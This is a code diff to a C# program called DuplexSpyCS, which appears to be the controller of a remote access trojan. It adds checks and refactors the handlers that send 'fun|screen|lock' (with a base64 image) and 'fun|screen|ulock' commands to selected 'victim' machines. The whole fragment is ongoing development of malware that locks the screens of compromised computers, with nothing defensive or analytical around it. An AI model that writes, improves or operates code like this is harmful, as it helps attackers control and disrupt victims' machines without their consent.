@@ -48,6 +48,9 @@ namespace DuplexSpyCS
 
         private void fnRecv(clsListener listener, clsVictim victim, List<string> cmd)
         {
+            if (!m_lsVictim.Contains(victim))
+                return;
+
             if (cmd[0] == "fun")
             {
                 if (cmd[1] == "screen")
@@ -129,11 +132,17 @@ namespace DuplexSpyCS
                 return;
             }
 
+            List<clsVictim> lsVictim = listView1.CheckedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
+            if (lsVictim.Count == 0)
+            {
+                MessageBox.Show("Please check a item!", "Nothing!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+
             string szImageBase64 = clsTools.ImageToBase64(szFileName);
 
-            foreach (ListViewItem item in listView1.CheckedItems)
+            foreach (var v in lsVictim)
             {
-                clsVictim v = (clsVictim)item.Tag;
                 v.SendCommand("fun|screen|lock|" + szImageBase64);
             }
         }
@@ -148,11 +157,17 @@ namespace DuplexSpyCS
                 return;
             }
 
+            List<clsVictim> lsVictim = listView1.CheckedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
+            if (lsVictim.Count == 0)
+            {
+                MessageBox.Show("Please check a item!", "Nothing!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+
             string szImageBase64 = clsTools.ImageToBase64(szFileName);
 
-            foreach (ListViewItem item in listView1.CheckedItems)
+            foreach (var v in lsVictim)
             {
-                clsVictim v = (clsVictim)item.Tag;
                 v.SendCommand("fun|screen|ulock");
             }
         }
